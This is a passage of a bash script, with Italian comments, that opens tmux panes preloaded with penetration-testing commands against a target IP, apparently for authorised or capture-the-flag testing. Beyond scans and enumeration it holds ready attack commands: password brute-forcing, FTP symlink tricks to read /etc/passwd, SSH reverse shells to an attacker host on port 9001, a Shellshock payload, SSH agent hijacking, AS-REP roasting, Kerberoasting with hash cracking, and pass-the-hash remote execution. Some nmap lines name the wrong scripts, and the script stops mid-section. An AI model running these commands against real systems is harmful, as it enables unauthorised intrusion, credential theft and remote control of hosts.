# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# duckduckgo vulnerability scan" Enter
tmux send-keys -t PT:1.0 "xdg-open \"https://duckduckgo.com/?q=<servizio>+default+password\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+default+credentials\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+vulnerability+poc+github\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+exploit+poc+github\""
tmux send-keys -t PT:1.1 "# searchsploit vulnerability scan" Enter
tmux send-keys -t PT:1.1 "searchsploit \"<servizio>\""
tmux send-keys -t PT:1.2 "# msfconsole vulnerability scan" Enter
tmux send-keys -t PT:1.2 "msfupdate; msfconsole -qx \"search type:exploit <servizio>\""
cd $folderProject


# WEB google dork
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:2 -n 'google dork'
tmux split-window -v -t PT:2.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "domain=$domain" Enter
tmux send-keys -t PT:2.0 "ip=$ip" Enter
tmux send-keys -t PT:2.0 "site=$site" Enter
tmux send-keys -t PT:2.0 "# google dork" Enter
tmux send-keys -t PT:2.0 "grep -v '^#' $folderProjectEngine/google-dork.txt | sed 's/\$domain/\\$domain/g' | xargs -I {} xdg-open \"https://google.com/?q=\"{}"
cd $folderProject


# Nessus
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:3 -n 'Nessus'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# nessus vulnerability scan" Enter
tmux send-keys -t PT:3.0 "sudo systemctl start nessusd && sleep 2 && xdg-open \"https://127.0.0.1:8834/\""
cd $folderProject


# Nikto
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:4 -n 'Nikto'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# Nikto vulnerability scan" Enter
tmux send-keys -t PT:4.0 "sudo nikto -h $url"
cd $folderProject



# ZAP
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:5 -n 'ZAP'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# ZAP vulnerability scan" Enter
tmux send-keys -t PT:5.0 "sudo /opt/zaproxy/zap.sh"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;











        6)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Service AuthN bypass: ssh, ftp, smtp,  etc
######################
######################
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectInfoGathering" Enter

# Service AuthN bypass
cd $folderProjectAuthN
# ALL PROTOCOL !!!
tmux new-window -t PT:1 -n 'ALL PROTOCOLs activities'
tmux split-window -v -t PT:1.0
tmux select-pane -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -h -t "1.0"
tmux split-window -v -t PT:1.3
tmux select-pane -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -h -t "1.3"
tmux split-window -v -t PT:1.7
tmux select-pane -t "1.7"
tmux split-window -h -t "1.7"
tmux split-window -h -t "1.7"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# Bruteforce find DICTIONARY with seclists" Enter
tmux send-keys -t PT:1.0 "find /usr/share/seclists/ -follow | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:1.1 "# Bruteforce find DICTIONARY with seclists" Enter
tmux send-keys -t PT:1.1 "find /usr/share/seclists/ -follow | grep pass | xargs wc -l | sort -n"
tmux send-keys -t PT:1.2 "# Create DICTIONARY with cewl" Enter
tmux send-keys -t PT:1.2 "cewl $url -d 3 -m 5 -w cewl-subdomain.txt --with-numbers"
tmux send-keys -t PT:1.3 "# Bruteforce with HYDRA" Enter
tmux send-keys -t PT:1.3 "hydra -L users.txt -P passwords.txt [-t 32] $ip ftp"
tmux send-keys -t PT:1.4 "# Bruteforce with NCRACK" Enter
tmux send-keys -t PT:1.4 "ncrack -p 21 -U users.txt -P passwords.txt $ip [-T 5]"
tmux send-keys -t PT:1.5 "# Bruteforce with MEDUSA" Enter
tmux send-keys -t PT:1.5 "medusa -U users.txt -P passwords.txt -h $ip -M ftp"
tmux send-keys -t PT:1.6 "# Bruteforce with CRACKMAPEXEC" Enter
tmux send-keys -t PT:1.6 "crackmapexec ssh $ip -u users.txt -p pass.txt "
tmux send-keys -t PT:1.7 "# Exploitation: update searchsploit" Enter
tmux send-keys -t PT:1.7 "searchsploit -u"
tmux send-keys -t PT:1.8 "# Exploitation: search" Enter
tmux send-keys -t PT:1.8 "searchsploit \"<service to attack>\""
tmux send-keys -t PT:1.9 "# Exploitation with msfconsole" Enter
tmux send-keys -t PT:1.9 "msfconsole -qx \"search type:exploit <servizio da cercare>\""
cd $folderProject


# Service AuthN bypass
cd $folderProjectAuthN
# FTP
tmux new-window -t PT:2 -n '[21] FTP'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
tmux select-pane -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
tmux split-window -h -t "2.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# FTP service fingerprint" Enter
tmux send-keys -t PT:2.0 "nmap -sV -Pn -vv -p 21 --script=ftp* $ip -oA out.21"
tmux send-keys -t PT:2.1 "# FTP Information Exposure: get all data PASSIVE mode" Enter
tmux send-keys -t PT:2.1 "wget -m ftp://anonymous:anonymous@$ip"
tmux send-keys -t PT:2.2 "# FTP Information Exposure: gat all data ACTIVe mode " Enter
tmux send-keys -t PT:2.2 "wget -m –no-passive ftp://anonymous:anonymous@$ip"
tmux send-keys -t PT:2.3 "# FTP Information Exposure: get all data specifying user and pass" Enter
tmux send-keys -t PT:2.3 "wget -r --user=\"user\" --password=\"Pass\" ftp://$ip"
tmux send-keys -t PT:2.4 "# FTP Information Exposure; Symlink attack with site exec" Enter
tmux send-keys -t PT:2.4 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site exec ln -s /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
tmux send-keys -t PT:2.5 "# FTP Information Exposure; Symlink attack with site symlink " Enter
tmux send-keys -t PT:2.5 "(echo \"user anonymous anonymous\"; echo \"help\"; echo \"site symlink /etc/passwd passwd_ln\"; echo \"site exec passwd_ln\"; echo \"bye\") | ftp -n $ip"
cd $folderProject

cd $folderProjectAuthN
# GIT
tmux new-window -t PT:3 -n '[22,80,445] GIT'
tmux split-window -v -t PT:3.0
tmux select-pane -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -h -t "3.0"
tmux split-window -v -t PT:3.6
tmux select-pane -t "3.6"
tmux split-window -h -t "3.6"
tmux split-window -h -t "3.6"
tmux split-window -v -t PT:3.9
tmux select-pane -t "3.9"
tmux split-window -h -t "3.9"
tmux split-window -h -t "3.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# GIT download LOCAL repository" Enter
tmux send-keys -t PT:3.0 "git clone /opt/git/project.git"
tmux send-keys -t PT:3.1 "# GIT download LOCAL repository" Enter
tmux send-keys -t PT:3.1 "git clone file:///opt/git/project.git"
tmux send-keys -t PT:3.2 "# GIT download REMOTE repository" Enter
tmux send-keys -t PT:3.2 "git clone $url/project.git"
tmux send-keys -t PT:3.3 "# GIT download REMOTE repository" Enter
tmux send-keys -t PT:3.3 "git clone ssh://user@$domain/project.git"
tmux send-keys -t PT:3.4 "# GIT download .git file" Enter
tmux send-keys -t PT:3.4 "source git_stuff/bin/activate && git-dumper $url/.git/ ./"
tmux send-keys -t PT:3.5 "# GIT download .git file" Enter
tmux send-keys -t PT:3.5 "wget --recursive --no-clobber --page-requisites --convert-links --domains targetDomain.ctf --no-parent $url/.git/"
tmux send-keys -t PT:3.6 "# GIT repository analysis (user, pass, token) with gitleaks" Enter
tmux send-keys -t PT:3.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
tmux send-keys -t PT:3.7 "# GIT repository analysis (user, pass, token) with trufflwhog" Enter
tmux send-keys -t PT:3.7 "trufflehog git /path/to/.git"
tmux send-keys -t PT:3.8 "# GIT repository analysis (user, pass, token) with grep" Enter
tmux send-keys -t PT:3.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
tmux send-keys -t PT:3.9 "# GIT: navigate the repository versioning" Enter
tmux send-keys -t PT:3.9 "git log -p"
tmux send-keys -t PT:3.10 "# GIT: navigate the repository versioning" Enter
tmux send-keys -t PT:3.10 "git diff <UUID commit>"
tmux send-keys -t PT:3.11 "# GIT: navigate the repository versioning" Enter
tmux send-keys -t PT:3.11 "git reset --hard <UUID commit>"
cd $folderProject

cd $folderProjectAuthN
# SSH
tmux new-window -t PT:4 -n '[22] SSH'
tmux split-window -v -t PT:4.0
tmux split-window -v -t PT:4.1
tmux select-pane -t "4.1"
tmux split-window -h -t "4.1"
tmux split-window -v -t PT:4.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# SSH Service fingerprint" Enter
tmux send-keys -t PT:4.0 "nmap -sV -Pn -vv -p 22 --script=ftp* $ip -oA out.22"
tmux send-keys -t PT:4.1 "# SSH blocked bypass calling attackerIP:9001" Enter
tmux send-keys -t PT:4.1 "ssh <USER>@$ip 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc $attackerIP 9001 >/tmp/f'"
tmux send-keys -t PT:4.2 "# SSH blocked bypass calling attackerIP:9001" Enter
tmux send-keys -t PT:4.2 "ssh <USER>@$ip '() { :;}; /bin/nc -nv $attackerIP 9001 -e /bin/bash'"
tmux send-keys -t PT:4.3 "# SSH Hijacking" Enter
tmux send-keys -t PT:4.3 "SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.XXXX ssh root@<TARGET_IP> -p <TARGET_PORT>"
cd $folderProject

cd $folderProjectAuthN
# SVN
tmux new-window -t PT:5 -n '[22,80,443,3690] SVN'
tmux split-window -v -t PT:5.0
tmux select-pane -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -h -t "5.0"
tmux split-window -v -t PT:5.3
tmux select-pane -t "5.3"
tmux split-window -h -t "5.3"
tmux split-window -h -t "5.3"
tmux split-window -v -t PT:5.6
tmux select-pane -t "5.6"
tmux split-window -h -t "5.6"
tmux split-window -h -t "5.6"
tmux split-window -v -t PT:5.9
tmux select-pane -t "5.9"
tmux split-window -h -t "5.9"
tmux split-window -h -t "5.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# SVN: download SVN repository" Enter
tmux send-keys -t PT:5.0 "svn checkout $url/url-del-repo-svn /path/to/local/folder"
tmux send-keys -t PT:5.1 "# SVN: download SVN repository" Enter
tmux send-keys -t PT:5.1 "svn checkout file:///$site/percorso/del/repo/svn /path/to/local/folder"
tmux send-keys -t PT:5.2 "# SVN: analyze SVN repo with grep" Enter
tmux send-keys -t PT:5.2 "grep -r \"password\|token\|api_key\" /path/to/local/folder"
tmux send-keys -t PT:5.3 "# SVN: download SVN repository as GIT one" Enter
tmux send-keys -t PT:5.3 "git svn clone $url/url-del-repo-svn"
tmux send-keys -t PT:5.4 "# SVN: download SVN repository as GIT one" Enter
tmux send-keys -t PT:5.4 "git svn clone --stdlayout --prefix=svn/ --no-metadata $url/url-del-repo-svn"
tmux send-keys -t PT:5.5 "# SVN: download SVN repository as GIT one" Enter
tmux send-keys -t PT:5.5 "git svn clone --trunk=nome_trunk --branches=nome_branches --tags=nome_tags https://url-del-repo-svn"
tmux send-keys -t PT:5.6 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with gitleaks" Enter
tmux send-keys -t PT:5.6 "sudo gitleaks detect --source=/path/to/.git --verbose"
tmux send-keys -t PT:5.7 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with trufflwhog" Enter
tmux send-keys -t PT:5.7 "trufflehog git /path/to/.git"
tmux send-keys -t PT:5.8 "# SVN repository (downloaded as GIT repo) analysis (user, pass, token) with grep" Enter
tmux send-keys -t PT:5.8 "grep -r \"password\|secret\|token\|key\" /home/kali/Desktop/appo/SiteSniper/"
tmux send-keys -t PT:5.9 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
tmux send-keys -t PT:5.9 "git log -p"
tmux send-keys -t PT:5.10 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
tmux send-keys -t PT:5.10 "git diff <UUID commit>"
tmux send-keys -t PT:5.11 "# SVN: navigate the SVN repository (downloaded as GIT repo) versioning" Enter
tmux send-keys -t PT:5.11 "git reset --hard <UUID commit>"
cd $folderProject

cd $folderProjectAuthN
# Telnet
tmux new-window -t PT:6 -n '[23] Telnet'
tmux split-window -v -t PT:6.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# Telnet: Service fingerprint" Enter
tmux send-keys -t PT:6.0 "nmap -sV -Pn -vv -p 23 --script=telnet* $ip -oA out.23"
cd $folderProject

cd $folderProjectAuthN
# SMTP
tmux new-window -t PT:7 -n '[25] SMTP'
tmux split-window -v -t PT:7.0
tmux split-window -v -t PT:7.1
tmux select-pane -t "7.1"
tmux split-window -h -t "7.1"
tmux split-window -h -t "7.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:7.0 "# SMTP: Service fingerprint" Enter
tmux send-keys -t PT:7.0 "nmap -sV -Pn -vv -p 25 --script=smtp-* $ip -oA out.25"
tmux send-keys -t PT:7.1 "# SMTP: Email enumeration with ismtp" Enter
tmux send-keys -t PT:7.1 "ismtp -h $ip:25 -e ./users.txt"
tmux send-keys -t PT:7.2 "# SMTP: Email enumeration with smtp-user-enum" Enter
tmux send-keys -t PT:7.2 "smtp-user-enum -M VRFY -D $domain -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t $ip | cut -d " " -f2 | tee smtp.user.txt"
tmux send-keys -t PT:7.3 "# SMTP: Email enumeration manually (with telnet + VRFY email)" Enter
tmux send-keys -t PT:7.3 "telnet $ip 25"
cd $folderProject

cd $folderProjectAuthN
# DNS
tmux new-window -t PT:8 -n '[53] DNS'
tmux split-window -v -t PT:8.0
tmux split-window -v -t PT:8.1
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:8.0 "# DNS: Service fingerprint" Enter
tmux send-keys -t PT:8.0 "nmap -sV -Pn -vv -p 53 --script=smtp-* $ip -oA out.53"
tmux send-keys -t PT:8.1 "# DNS: Information Gathering" Enter
tmux send-keys -t PT:8.1 "##############################################################" Enter
tmux send-keys -t PT:8.1 "## PLEASE REFER TO OSINT > OSINT: Data Exfiltration Section ##" Enter
tmux send-keys -t PT:8.1 "##############################################################" Enter
tmux send-keys -t PT:8.1 ""
cd $folderProject

cd $folderProjectAuthN
# TFTP
tmux new-window -t PT:9 -n '[69] TFTP'
tmux split-window -v -t PT:9.0
tmux split-window -v -t PT:9.1
tmux split-window -v -t PT:9.2
tmux split-window -v -t PT:9.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:9.0 "# TFTP: Service fingerprint" Enter
tmux send-keys -t PT:9.0 "nmap -sV -Pn -vv -p 69 --script=smtp-* $ip -oA out.69"
tmux send-keys -t PT:9.1 "# TFTP: File enumeration" Enter
tmux send-keys -t PT:9.1 "nmap  -sU -p69 --script tftp-enum --script-args tftp-enum.filelist=customlist.txt $ip -Pn"
tmux send-keys -t PT:9.2 "# TFTP: bruteforce" Enter
tmux send-keys -t PT:9.2 "msfconsole -q -x \"use auxiliary/scanner/tftp/tftpbrute; set RHOSTS $ip; set DICTIONARY /usr/share/metasploit-framework/data/wordlists/tftp.txt; run\""
tmux send-keys -t PT:9.3 "# TFTP: bruteforce" Enter
tmux send-keys -t PT:9.3 "###############################################################" Enter
tmux send-keys -t PT:9.3 "## ALSO PLEASE REFER TO SERVICE AUTHN BYPASS > ALL PROTOCOLs ##" Enter
tmux send-keys -t PT:9.3 "###############################################################" Enter
tmux send-keys -t PT:9.3 ""
cd $folderProject

cd $folderProjectAuthN
# finger
tmux new-window -t PT:10 -n '[79] Finger'
tmux split-window -v -t PT:10.0
tmux split-window -v -t PT:10.1
tmux select-pane -t "10.1"
tmux split-window -h -t "10.1"
tmux split-window -h -t "10.1"
tmux split-window -v -t PT:10.4
tmux select-pane -t "10.4"
tmux split-window -h -t "10.4"
tmux split-window -h -t "10.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:10.0 "# Finger: Service fingerprint" Enter
tmux send-keys -t PT:10.0 "nmap -sV -Pn -vv -p 79 --script=finger* $ip -oA out.79"
tmux send-keys -t PT:10.1 "# Finger: Enumerate Connected Users with finger" Enter
tmux send-keys -t PT:10.1 "finger @$ip"
tmux send-keys -t PT:10.2 "# Finger: Get extended info for a specific User with finger" Enter
tmux send-keys -t PT:10.2 "finger -l utente@$ip"
tmux send-keys -t PT:10.3 "# Finger: Get restricted info for a specific User with finger" Enter
tmux send-keys -t PT:10.3 "finger -s utente@$ip"
tmux send-keys -t PT:10.4 "# Find a user's dictionary to enumerate target user with finger-user-enum" Enter
tmux send-keys -t PT:10.4 "find /usr/share/seclists/ -follow | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:10.5 "# Finger: Enumerate target users with finger-user-enum" Enter
tmux send-keys -t PT:10.5 "/opt/finger-user-enum/finger-user-enum/finger-user-enum.pl -U usernames.txt -t $ip | tee finger.user.txt"
tmux send-keys -t PT:10.6 "# Finger: Enumerate target users with msfconsole" Enter
tmux send-keys -t PT:10.6 "msfconsole -q -x \"use auxiliary/scanner/finger/finger_users; set RHOSTS $ip; run\""
cd $folderProject

cd $folderProjectAuthN
# Kerberos - Enumeration
tmux new-window -t PT:11 -n '[88] Kerberos - Enumeration'
tmux split-window -v -t PT:11.0
tmux select-pane -t "11.0"
tmux split-window -h -t "11.0"
tmux split-window -v -t PT:11.2
tmux select-pane -t "11.2"
tmux split-window -h -t "11.2"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:11.0 "# Kerberos-Enumeration: create a username dictionary with usrname-anarchy" Enter
tmux send-keys -t PT:11.0 "sudo /opt/username-anarchy/username-anarchy mario rossi"
tmux send-keys -t PT:11.1 "# Kerberos-Enumeration: create a username dictionary with webSite" Enter
tmux send-keys -t PT:11.1 "grep -v '^#' $folderProjectEngine/kerberos-enumeration.txt | xargs -I {} xdg-open {}"
tmux send-keys -t PT:11.2 "# Kerberos-Enumeration: Verify valid username with nmap" Enter
tmux send-keys -t PT:11.2 "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="$domain",userdb=users.txt $ip"
tmux send-keys -t PT:11.3 "# Kerberos-Enumeration: Verify valid username with kerbrute" Enter
tmux send-keys -t PT:11.3 "/home/kali/.local/bin/kerbrute -users users.txt -dc-ip $ip -domain $domain "
cd $folderProject

cd $folderProjectAuthN
# Kerberos - ASREP-roasting
tmux new-window -t PT:12 -n '[88] Kerberos - ASREP-roasting'
tmux split-window -v -t PT:12.0
tmux select-pane -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -h -t "12.0"
tmux split-window -v -t PT:12.5
tmux select-pane -t "12.5"
tmux split-window -h -t "12.5"
tmux split-window -v -t PT:12.7
tmux select-pane -t "12.7"
tmux split-window -h -t "12.7"
tmux split-window -h -t "12.7"
tmux split-window -h -t "12.7"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with MORE USERNAME" Enter
tmux send-keys -t PT:12.0 "netexec ldap $ip -u users.txt -p '' --asreproast"
tmux send-keys -t PT:12.1 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with MORE USERNAME" Enter
tmux send-keys -t PT:12.1 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/ -dc-ip $ip -no-pass -usersfile user.txt -outputfile asrep.txt -format john"
tmux send-keys -t PT:12.2 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with TGT REQUEST and a single file with MORE USERNAME" Enter
tmux send-keys -t PT:12.2 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/user1 -dc-ip $ip -no-pass -outputfile asrep.txt -format john"
tmux send-keys -t PT:12.3 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with GENERIC REQUEST and a single file with SINGLE USERNAME" Enter
tmux send-keys -t PT:12.3 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py $domain/user1 -dc-ip $ip -no-pass -outputfile asrep.txt -format john"
tmux send-keys -t PT:12.4 "# Kerberos-ASREP-roasting: Enumerate SPNs and HASH-NT with TGT REQUEST and a single file with SINGLE USERNAME" Enter
tmux send-keys -t PT:12.4 "/usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip $ip -request 'sequel.htb/user1' -format hashcat -outputfile ~/my.hash"
tmux send-keys -t PT:12.5 "# Kerberos-ASREP-roasting: Crack token TGT with John The Ripper" Enter
tmux send-keys -t PT:12.5 "john asrep.txt --wordlist=/path/to/wordlist"
tmux send-keys -t PT:12.6 "# Kerberos-ASREP-roasting: Crack token TGT with hashcat" Enter
tmux send-keys -t PT:12.6 "hashcat -m 18200 -d 3 -a 0 my.hash rockyou.txt"
tmux send-keys -t PT:12.7 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
tmux send-keys -t PT:12.7 "evil-winrm -i $ip -u <utente> -p <password>"
tmux send-keys -t PT:12.8 "# Kerberos-ASREP-roasting: Access remote target with USERNAME-PASS" Enter
tmux send-keys -t PT:12.8 "crackmapexec smb $ip -u <utente> -p <password> -x \"<comando>\""
tmux send-keys -t PT:12.9 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
tmux send-keys -t PT:12.9 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
tmux send-keys -t PT:12.10 "# Kerberos-ASREP-roasting: Access remote target with PTT" Enter
tmux send-keys -t PT:12.10 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
cd $folderProject

cd $folderProjectAuthN
# Kerberos - KERBEROASTING
tmux new-window -t PT:13 -n '[88] Kerberos - KERBEROASTING'
tmux split-window -v -t PT:13.0
tmux select-pane -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -h -t "13.0"
tmux split-window -v -t "13.0"
tmux split-window -v -t PT:13.7
tmux select-pane -t "13.7"
tmux split-window -h -t "13.7"
tmux split-window -v -t PT:13.9
tmux select-pane -t "13.9"
tmux split-window -h -t "13.9"
tmux split-window -h -t "13.9"
tmux split-window -h -t "13.9"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials"  Enter
tmux send-keys -t PT:13.0 "netexec ldap $ip -u '<USER>' -p '<PASS>' –kerberosting"
tmux send-keys -t PT:13.1 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials" Enter
tmux send-keys -t PT:13.1 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $ip '$domain/<USER>:<PASS>'"
tmux send-keys -t PT:13.2 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with credentials" Enter
tmux send-keys -t PT:13.2 "crackmapexec ldap $ip -u <USER> -p '<PASS>' --kerberoasting kerberoastables.txt --kdcHost $ip"
tmux send-keys -t PT:13.3 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with ASREP-roasting users" Enter
tmux send-keys -t PT:13.3 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -no-preauth -usersfile utenti.txt -dc-host $ip $domain/ -request"
tmux send-keys -t PT:13.4 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with ASREP-roasting single user" Enter
tmux send-keys -t PT:13.4 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -no-preauth <USER> -dc-host $ip $domain/"
tmux send-keys -t PT:13.5 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with HASH-NT" Enter
tmux send-keys -t PT:13.5 "python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' -dc-ip $ip '$domain/<USER>'"
tmux send-keys -t PT:13.6 "# Kerberos KERBEROASTING: Enumerate SPNs and HASH-NT with HASH-NT" Enter
tmux send-keys -t PT:13.6 "crackmapexec ldap $ip -u <USER> -H '<HASH-NT>' --kerberoasting kerberoastables.txt --kdcHost $ip"
tmux send-keys -t PT:13.7 "# Kerberos KERBEROASTING: Crack token TGT with hashcat" Enter
tmux send-keys -t PT:13.7 "hashcat -m 13100 -d 3 -a 0 my.hash rockyou.txt"
tmux send-keys -t PT:13.8 "# Kerberos KERBEROASTING: Crack token TGT with JOHN" Enter
tmux send-keys -t PT:13.8 "john --format=krb5tgs --wordlist=passwords.txt kerberoastables.txt"
tmux send-keys -t PT:13.9 "# Kerberos KERBEROASTING: Get a shell on remote system with CREDENTIALs" Enter
tmux send-keys -t PT:13.9 "evil-winrm -i $ip -u <utente> -p <password>"
tmux send-keys -t PT:13.10 "# Kerberos KERBEROASTING: Get a shell on remote system with CREDENTIALs" Enter
tmux send-keys -t PT:13.10 "crackmapexec smb $ip -u <utente> -p <password> -x \"<comando>\""
tmux send-keys -t PT:13.11 "# Kerberos KERBEROASTING: Get a shell on remote system with HASH-NT" Enter
tmux send-keys -t PT:13.11 "evil-winrm -i $ip -u <utente> -H <hash_NT>"
tmux send-keys -t PT:13.12 "# Kerberos KERBEROASTING: Get a shell on remote system with HASH-NT" Enter
tmux send-keys -t PT:13.12 "crackmapexec smb $ip -u <utente> -H <HASH-NT> -x \"<comando>\""
cd $folderProject

cd $folderProjectAuthN
# POP3
tmux new-window -t PT:14 -n '[110,995] POP3'
tmux split-window -v -t PT:14.0
tmux split-window -v -t PT:14.1
tmux select-pane -t "14.1"
tmux split-window -h -t "14.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# POP3: Service fingerprint" Enter
tmux send-keys -t PT:14.0 "nmap -sV -Pn -vv -p 110 --script=pop3* $ip -oA out.110"
tmux send-keys -t PT:14.1 "# POP3: get Banner" Enter
tmux send-keys -t PT:14.1 "telnet $ip 110"
tmux send-keys -t PT:14.2 "printf \"\n# POP3: get Emails\n# USER myUser\n# PASS myPass\n# list\n# retr 5\" " Enter
tmux send-keys -t PT:14.2 "telnet $ip 110"
cd $folderProject


cd $folderProjectAuthN
# NFS
tmux new-window -t PT:15 -n '[111,2049] NFS'
tmux split-window -v -t PT:15.0
tmux split-window -v -t PT:15.1
tmux select-pane -t "15.1"
tmux split-window -h -t "15.1"
tmux split-window -h -t "15.1"
tmux split-window -v -t PT:15.4
tmux split-window -v -t PT:15.5
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:15.0 "# NFS: Service fingerprint" Enter
tmux send-keys -t PT:15.0 "nmap -sV -Pn -vv -p 111 --script=nfs* $ip -oA out.111"
tmux send-keys -t PT:15.1 "# NFS: Verify if NTS is enabled on top of RPC" Enter
tmux send-keys -t PT:15.1 "rpcinfo -p $ip | grep nfs"
tmux send-keys -t PT:15.2 "# NFS: get info on service exposed by RPC" Enter
tmux send-keys -t PT:15.2 "nmap -sV -Pn -vv -p 111 --script=rpc2info $ip"
tmux send-keys -t PT:15.3 "# NFS: enumerate remote folder" Enter
tmux send-keys -t PT:15.3 "showmount –e $ip"
tmux send-keys -t PT:15.4 "# NFS: mount remote folder" Enter
tmux send-keys -t PT:15.4 "sudo mkdir /mnt/opt && sudo mount -t nfs -o nolock $ip:/opt /mnt/opt"
tmux send-keys -t PT:15.5 "printf \"\n# NFS: If you get the error\n# ls: cannot open directory 'vulnix': Permission denied\n# Please refer to the manual 'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\n\n# NFS: Exploit: NFS root squashing\n# If NFS is active and on remote server 'no_root_squash' is active\n# then NFS root squashing attack could be possible \n# Please refer to the manual \n'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\" " Enter
cd $folderProject

cd $folderProjectAuthN
# NTQ
tmux new-window -t PT:16 -n '[123] NTP'
tmux split-window -v -t PT:16.0
tmux split-window -v -t PT:16.1
tmux select-pane -t "15.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:16.0 "# NTP: Service fingerprint" Enter
tmux send-keys -t PT:16.0 "nmap -sV -Pn -vv -p 123 --script=ntq* $ip -oA out.123"
tmux send-keys -t PT:16.1 "# NTP: get information from NTQ service" Enter
tmux send-keys -t PT:16.1 "ntpq -c readlist $ip && ntpq -c readvar $ip && ntpq -c peers $ip && ntpq -c associations $ip && ntpq -c iostat $ip && ntpq -c peers $ip && ntpq -c sysinfo $ip"
tmux send-keys -t PT:16.2 "# NTP: get date and time from NTQ service" Enter
tmux send-keys -t PT:16.2 "sudo python3 $folderProjectEngine/ntq.py $ip"
cd $folderProject

cd $folderProjectAuthN
# WMI
tmux new-window -t PT:17 -n '[135] WMI'
tmux split-window -v -t PT:17.0
# Esecuzione dei comandi nelle sottofinestre
